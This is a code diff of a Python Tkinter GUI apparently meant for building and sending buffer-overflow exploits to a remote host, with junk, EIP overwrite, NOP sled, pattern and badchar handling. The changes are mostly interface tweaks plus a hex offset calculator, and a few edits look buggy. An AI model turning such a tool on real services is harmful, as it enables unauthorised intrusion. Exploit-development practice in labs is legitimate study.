@@ -7,6 +7,7 @@ from os import *
 from sys import *
 from os import *
 from Tkinter import *
+from tkinter import *
 from especialfuncs import *
 import badchanged
 from badchanged import stringchars, jmp, buf
@@ -17,6 +18,8 @@ rhost = ""
 rport = 0
 rlogin = "Anonymous"
 rpass = ""
+xcount = 0
+ycount = 0
 
 eip = "\x42\x42\x42\x42"
 #END GLOBAL VARIABLES
@@ -93,16 +96,16 @@ pattcheckop.grid(row=1, column=5)
 
 #BEGIN MULTIPILERS:
 junklabel = Label(mainframe, text="Junk:").grid(row=1, column=6)
-junkmultipiler = Spinbox(mainframe, from_=0, to=100000, width=3)
+junkmultipiler = Spinbox(mainframe, from_=0, to=100000, width=4)
 junkmultipiler.grid(row=1, column=7)
 
 pattlabel = Label(mainframe, text="Pattern:").grid(row=1, column=8)
-pattmultipiler = Spinbox(mainframe, from_=0, to=1000, width=3)
+pattmultipiler = Spinbox(mainframe, from_=0, to=1000, width=4)
 pattmultipiler.grid(row=1, column=9)
 #END MULTIPILERS
 
 #Second frame with  text:
-secondframe = LabelFrame(root, text="Define remote target informations:", bd=0, padx=5, pady=5)
+secondframe = LabelFrame(root, text="-Define remote target informations:", bd=0, padx=5, pady=5)
 secondframe.pack(fill="both")
 ############################################################################
 
@@ -134,7 +137,7 @@ def exploitbt():
     junk = "\x41"*int(junkmultipiler.get())
     sccalc = "\x43"*int(junkmultipiler.get())*2
     nops = "\x90"*int(nopsmultipiler.get())
-    pattern = pattern_gen(int(pattmultipiler.get()))
+    pattern = pattern_gen(int(junkmultipiler.get()))
     exploit = junk + eip
     
     
@@ -164,10 +167,13 @@ def exploitbt():
 
     if Randomcheck.get() == 1:
         mtpjunk = int(junkmultipiler.get())
-        for number in range(0, mtpjunk, 2):
-            #number = number + 1
+        for number in range(0, mtpjunk, 1):
+            number = number + 1
             junk = "\x41" * number
             statuslabel.configure(text="STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
+            #print(len(junk))
+            #print(junk)
+            print("STATUS: [+] Send payload with "+str(len(exploit))+" bytes.")
         else:
             pass
     else:
@@ -230,9 +236,16 @@ def exploitbt():
 exploitbt = Button(secondframe, text="exploit!", command=exploitbt)
 exploitbt.pack(side=LEFT)
 
+def reloadbt():
+    from especialfuncs import *
+    from badedit import *
+    import badchanged
+    from badchanged import stringchars, jmp, buf
+    
+    
 
 #closebl = Label(secondframe).pack(side=LEFT)
-reloadbt = Button(secondframe, text="EDIT!")
+reloadbt = Button(secondframe, text="RELOAD!", command=reloadbt)
 reloadbt.pack(side=LEFT)
 
 statuslabel = Label(secondframe, text="STATUS: [+] Send payload with  0  bytes.")
@@ -289,7 +302,7 @@ result.grid(row=1, column=11)
 #END PATTERN HEX OR ASCII SEARCH
 
 #Tools frame with text
-toolsframe = LabelFrame(root, text="Exploit edits:", padx=5, pady=5)
+toolsframe = LabelFrame(root, text="Calculator Tools:", padx=5, pady=5)
 toolsframe.pack(fill="both")
 ############################################################################
 
@@ -323,17 +336,48 @@ convert.grid(row=1, column=4)
 
 def convertnow():
     if Hexcheck.get() == 1:
-        convertresult.configure(text="THE CODE IS: "+(str(convert.get())).decode("hex"))
+        convertresult.configure(text="The code:     "+(str(convert.get())).decode("hex"))
     elif Asciicheck.get() == 1:
-        convertresult.configure(text="THE CODE IS: "+(str(convert.get())).encode("hex"))
+        convertresult.configure(text="The code:     "+(str(convert.get())).encode("hex"))
         
 separador = Label(toolsframe, text="  ").grid(row=1, column=5)
 convertbtl = Button(toolsframe, text="Convert!", command=convertnow)
 convertbtl.grid(row=1, column=6)
 
-convertresult = Label(toolsframe, text="THE CODE IS:         ")
+convertresult = Label(toolsframe, text="The code:         ")
 convertresult.grid(row=1, column=8)
 #END BEGIN HEX TO ASCII - ASCII TO HEX
+
+#BEGIN OF HEX CALC
+
+def calcyxdata():
+    xdhex = xdatahex.get()
+    xdhex = int(xdhex, 0)
+    ydhex = ydatahex.get()
+    ydhex = int(ydhex, 0)
+    xyhex = ydhex - xdhex
+
+    yxdatalabel.configure(text="   Space:  "+(str(xyhex)))
+    
+
+
+separador = Label(toolsframe, text="  ").grid(row=1, column=9)
+hexcalcbtl = Button(toolsframe, text="Calc!", command=calcyxdata)
+hexcalcbtl.grid(row=1, column=10)
+
+xdatalabel = Label(toolsframe, text="  Hex: ").grid(row=1, column=11)
+xdatahex = Entry(toolsframe, width=12)
+xdatahex.grid(row=1, column=12)
+datalabel = Label(toolsframe, text="  ( - )").grid(row=1, column=13)
+ydatalabel = Label(toolsframe, text="  Hex: ").grid(row=1, column=14)
+ydatahex = Entry(toolsframe, width=12)
+ydatahex.grid(row=1, column=15)
+
+yxdatalabel = Label(toolsframe, text="   Space:  ")
+yxdatalabel.grid(row=1, column=16)
+
+
+#END OF HEX CALC
 
 
 
@@ -341,7 +385,7 @@ convertresult.grid(row=1, column=8)
 #END PAYLOD EDIT
 
 #Payload and badchars with text
-finalframe = LabelFrame(root, text="Payload and Badchars:", padx=5, pady=5, bd=0)
+finalframe = LabelFrame(root, text="-Payload and Badchars:", padx=5, pady=5, bd=0)
 finalframe.pack(fill="both")
 ############################################################################
 
